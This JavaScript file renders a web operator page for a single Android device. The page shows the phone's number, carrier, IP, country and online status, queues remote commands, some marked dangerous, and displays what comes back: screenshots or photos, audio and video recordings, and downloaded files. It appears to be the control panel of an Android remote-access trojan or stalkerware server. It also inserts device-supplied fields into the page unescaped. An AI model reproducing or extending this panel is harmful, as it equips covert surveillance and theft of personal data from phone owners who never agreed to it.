import { GROUPS } from '../src/commands.js';
import { layout } from './layout.js';

export function renderDevice(user, id, COMMANDS, title) {
  const cmdJson = JSON.stringify(COMMANDS);
  const groupsJson = JSON.stringify(GROUPS);
  const devId = JSON.stringify(id);

  const body = `
<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:20px">
  <div>
    <a href="/panel" class="muted" style="font-size:12px">← back</a>
    <h1 id="dev-title" style="font-weight:400;font-size:20px;margin-top:6px">Loading device…</h1>
    <div id="dev-sub" class="muted mono-sm" style="margin-top:4px"></div>
  </div>
  <div id="dev-status"></div>
</div>

<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
  <div>
    <div class="card" style="margin-bottom:16px">
      <div class="card-title">Device Info</div>
      <div id="dev-info" class="mono-sm" style="display:grid;
       grid-template-columns:auto 1fr;gap:6px 16px;font-size:12px"></div>
    </div>

    <div class="card">
      <div class="card-title">Commands</div>
      <div id="cmd-groups"></div>
    </div>
  </div>

  <div>
    <div class="card" style="margin-bottom:16px">
      <div class="card-title">Console</div>
      <div id="console" style="background:#050608;border:1px solid var(--line);
       border-radius:6px;padding:12px;font-family:var(--mono);font-size:12px;
       height:260px;overflow-y:auto;color:#7d8794;line-height:1.7"></div>
    </div>

    <div class="card">
      <div class="card-title">Results</div>
      <div id="results" style="display:flex;flex-direction:column;gap:10px;
       max-height:600px;overflow-y:auto"></div>
    </div>
  </div>
</div>

<div id="modal" style="position:fixed;inset:0;background:rgba(0,0,0,.7);
 backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:100">
  <div class="card" style="width:100%;max-width:460px;padding:24px">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
      <div id="m-title" style="font-weight:600;font-size:15px">Command</div>
      <button class="btn btn-sm" onclick="closeModal()">Esc</button>
    </div>
    <div id="m-desc" class="muted" style="margin-bottom:16px;font-size:12px"></div>
    <div id="m-args"></div>
    <div style="display:flex;gap:8px;margin-top:20px;justify-content:flex-end">
      <button class="btn" onclick="closeModal()">Cancel</button>
      <button class="btn btn-primary" id="m-run" onclick="runCmd()">Execute</button>
    </div>
  </div>
</div>

<script>
const DEVICE_ID = ${devId};
const COMMANDS = ${cmdJson};
const GROUPS = ${groupsJson};
let currentCmd = null;
let lastResultsHash = '';

function log(msg, color){
  const c = document.getElementById('console');
  const t = new Date().toLocaleTimeString();
  const line = document.createElement('div');
  line.innerHTML = '<span style="color:#334155">[' + t + ']</span> <span style="color:'+(color||'#7d8794')+'">' + msg + '</span>';
  c.appendChild(line);
  c.scrollTop = c.scrollHeight;
}

function ago(ts){
  if(!ts) return '—';
  const d = Date.now() - ts;
  if(d < 60000) return Math.floor(d/1000)+'s ago';
  if(d < 3600000) return Math.floor(d/60000)+'m ago';
  if(d < 86400000) return Math.floor(d/3600000)+'h ago';
  return Math.floor(d/86400000)+'d ago';
}

async function loadDevice(){
  const r = await fetch('/api/op/device/' + DEVICE_ID);
  const j = await r.json();
  if(j.error){ log('load failed: ' + j.error, 'var(--red)'); return; }
  const d = j.device;
  document.getElementById('dev-title').textContent = (d.brand||'?') + ' ' + (d.model||'?');
  document.getElementById('dev-sub').textContent = d.id;
  document.getElementById('dev-info').innerHTML = [
    ['Brand', d.brand], ['Model', d.model], ['Android', d.android],
    ['SDK', d.sdk], ['Carrier', d.carrier], ['Phone', d.phone],
    ['Battery', (d.battery||0)+'%'], ['Country', d.country],
    ['IP', d.ip], ['First seen', new Date(d.first_seen).toLocaleString()],
    ['Last seen', ago(d.last_seen)]
  ].map(x => '<div class="muted">'+x[0]+'</div><div class="mono">'+(x[1]??'—')+'</div>').join('');

  const s = status(d.last_seen);
  document.getElementById('dev-status').innerHTML =
    '<span class="badge badge-'+s.c+'">'+s.l+'</span>';
}

function status(ts){
  const d = Date.now() - ts;
  if(d < 120000) return {c:'green', l:'ONLINE'};
  if(d < 900000) return {c:'yellow', l:'STALE'};
  return {c:'red', l:'OFFLINE'};
}

function renderCommands(){
  const cont = document.getElementById('cmd-groups');
  cont.innerHTML = GROUPS.map(g => {
    const cmds = Object.entries(COMMANDS).filter(([k,v]) => v.group === g);
    if(!cmds.length) return '';
    return '<div style="margin-bottom:18px">' +
      '<div class="card-title" style="font-size:11px;margin-bottom:8px">' + g + '</div>' +
      '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px">' +
      cmds.map(([k,v]) =>
        '<button class="btn ' + (v.danger?'btn-danger':'') + '" ' +
        'style="text-align:left;padding:10px 12px;font-size:12px" ' +
        'onclick="openModal(\\''+k+'\\')">' +
        '<div style="font-size:16px;margin-bottom:4px">'+v.icon+'</div>' +
        '<div style="font-weight:600">'+v.label+'</div></button>'
      ).join('') +
      '</div></div>';
  }).join('');
}

function openModal(key){
  const c = COMMANDS[key];
  currentCmd = key;
  document.getElementById('m-title').textContent = c.icon + ' ' + c.label;
  document.getElementById('m-desc').textContent = c.desc || '';
  const args = c.args || [];
  document.getElementById('m-args').innerHTML = args.length
    ? args.map(a => {
        const val = a.default !== undefined ? a.default : '';
        let input = '';
        if(a.type === 'select'){
          input = '<select name="'+a.name+'">' + a.options.map(o =>
            '<option '+(o===val?'selected':'')+'>'+o+'</option>').join('') + '</select>';
        } else {
          input = '<input name="'+a.name+'" type="'+a.type+'" value="'+val+'" ' +
            (a.placeholder?'placeholder="'+a.placeholder+'"':'')+' ' +
            (a.required?'required':'')+'>';
        }
        return '<div style="margin-bottom:12px"><label>'+a.label+'</label>'+input+'</div>';
      }).join('')
    : '<div class="muted" style="font-size:12px">No arguments.</div>';
  document.getElementById('modal').style.display = 'flex';
  setTimeout(() => {
    const first = document.querySelector('#m-args input, #m-args select');
    if(first) first.focus();
  }, 50);
}

function closeModal(){
  document.getElementById('modal').style.display = 'none';
  currentCmd = null;
}

async function runCmd(){
  if(!currentCmd) return;
  const args = {};
  document.querySelectorAll('#m-args input, #m-args select').forEach(el => {
    args[el.name] = el.type === 'number' ? Number(el.value) : el.value;
  });
  const r = await fetch('/api/op/cmd', {
    method: 'POST',
    headers: {'content-type':'application/json'},
    body: JSON.stringify({ device_id: DEVICE_ID, cmd: currentCmd, args })
  });
  const j = await r.json();
  if(j.error){ log('cmd error: ' + j.error, 'var(--red)'); return; }
  log('queued ' + currentCmd + ' → ' + j.command_id.slice(0,8), 'var(--acc)');
  closeModal();
}

async function loadResults(){
  const r = await fetch('/api/op/results?device_id=' + DEVICE_ID);
  const j = await r.json();
  const res = j.results || [];
  const hash = res.map(x => x.id).join(',');
  if(hash === lastResultsHash) return;
  lastResultsHash = hash;

  const el = document.getElementById('results');
  if(!res.length){
    el.innerHTML = '<div class="muted" style="font-size:12px">No results yet.</div>';
    return;
  }
  el.innerHTML = res.map(r => {
    let data = {};
    try { data = JSON.parse(r.data); } catch(e) {}
    const cmdInfo = COMMANDS[r.cmd] || {icon:'?', label: r.cmd || '?'};
    const isFile = r.file_key;
    const fileUrl = isFile ? '/api/op/file/' + encodeURIComponent(r.file_key) : null;
    const isImg = isFile && /\\.(png|jpg|jpeg|gif|webp|bmp)$/i.test(r.file_key);
    const isAudio = isFile && /\\.(mp3|wav|m4a|ogg|aac)$/i.test(r.file_key);
    const isVideo = isFile && /\\.(mp4|webm|mkv|mov|3gp)$/i.test(r.file_key);

    let body = '';
    if(data.error){
      body = '<div style="color:var(--red);font-size:12px">✕ ' + escapeHtml(data.error) + '</div>';
    } else if(isImg){
      body = '<img src="'+fileUrl+'" style="max-width:100%;border-radius:4px;border:1px solid var(--line)">';
    } else if(isAudio){
      body = '<audio controls src="'+fileUrl+'" style="width:100%"></audio>';
    } else if(isVideo){
      body = '<video controls src="'+fileUrl+'" style="width:100%;border-radius:4px"></video>';
    } else if(isFile){
      body = '<a href="'+fileUrl+'" class="btn btn-sm" download>⬇ download file</a>';
    } else if(data.data !== undefined && data.data !== null){
      body = '<pre class="mono" style="font-size:11px;background:#050608;padding:10px;' +
        'border-radius:4px;overflow:auto;max-height:220px;color:#8b949e">' +
        escapeHtml(typeof data.data === 'string' ? data.data : JSON.stringify(data.data, null, 2)) +
        '</pre>';
    } else {
      body = '<div class="muted" style="font-size:12px">(empty)</div>';
    }

    return '<div style="background:#050608;border:1px solid var(--line);' +
      'border-radius:6px;padding:12px">' +
      '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">' +
        '<div style="font-size:12px"><span style="margin-right:6px">'+cmdInfo.icon+'</span>' +
        '<span style="font-weight:600">'+cmdInfo.label+'</span></div>' +
        '<div class="mono-sm">'+ago(r.created)+'</div>' +
      '</div>' + body + '</div>';
  }).join('');
}

function escapeHtml(s){
  return String(s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}

document.addEventListener('keydown', e => {
  if(e.key === 'Escape') closeModal();
  if(e.key === 'Enter' && document.getElementById('modal').style.display === 'flex'){
    if(document.activeElement.tagName !== 'TEXTAREA') runCmd();
  }
});

renderCommands();
loadDevice();
loadResults();
setInterval(loadDevice, 5000);
setInterval(loadResults, 5000);

const wsProto = location.protocol === 'https:' ? 'wss://' : 'ws://';
try {
  const ws = new WebSocket(wsProto + location.host + '/ws/device/' + DEVICE_ID);
  ws.onmessage = e => { log('⟵ ' + e.data.slice(0,120), 'var(--green)'); loadResults(); };
  ws.onopen = () => log('ws connected', 'var(--purple)');
  ws.onclose = () => log('ws closed', 'var(--yellow)');
} catch(e){ log('ws failed: ' + e.message, 'var(--red)'); }
</script>`;
  return layout({ title: 'Device • ' + title, user, body, active: 'dash' });
}
